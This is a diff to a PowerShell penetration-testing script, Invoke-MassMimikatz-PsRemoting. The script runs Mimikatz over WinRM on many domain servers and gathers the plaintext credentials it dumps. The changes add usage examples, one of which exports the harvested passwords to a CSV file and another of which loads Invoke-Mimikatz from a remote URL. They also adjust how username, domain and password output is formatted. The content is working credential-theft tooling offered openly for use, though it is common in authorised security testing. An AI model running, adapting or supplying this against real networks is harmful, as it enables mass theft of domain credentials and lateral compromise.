@@ -1,6 +1,7 @@
 # Author: Scott Sutherland (@_nullbind), 2015 NetSPI
 # Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
-# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -DomainController dc.acme.com -Credential acme\user
+# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user
+# Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user | Export-Csv .\passwords.csv
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -verbose
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -OsFilter "2012" - verbose
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -PsUrl "https://10.1.1.1/Invoke-Mimikatz.ps1" -verbose
@@ -284,9 +285,9 @@ function Invoke-MassMimikatz-PsRemoting
             $TblResults = Parse-Mimikatz -raw $MimikatzOutput
             $TblResults | foreach {
             
-                [string]$pwtype = $_.pwtype
-                [string]$pwdomain = $_.domain
-                [string]$pwusername = $_.username
+                [string]$pwtype = $_.pwtype.ToLower()
+                [string]$pwdomain = $_.domain.ToLower()
+                [string]$pwusername = $_.username.ToLower()
                 [string]$pwpassword = $_.password
                 $TblPasswordList.Rows.Add($PWtype,$pwdomain,$pwusername,$pwpassword) | Out-Null
             }
@@ -301,7 +302,7 @@ function Invoke-MassMimikatz-PsRemoting
             $TblServers.Clear()
             
             # Return passwords
-            $TblPasswordList | select type,domain,username,password -Unique | Sort-Object domain,username,password
+            $TblPasswordList | select domain,username,password -Unique | Sort-Object domain,username,password
         
         }else{
             Write-verbose "No ps sessions could be created."
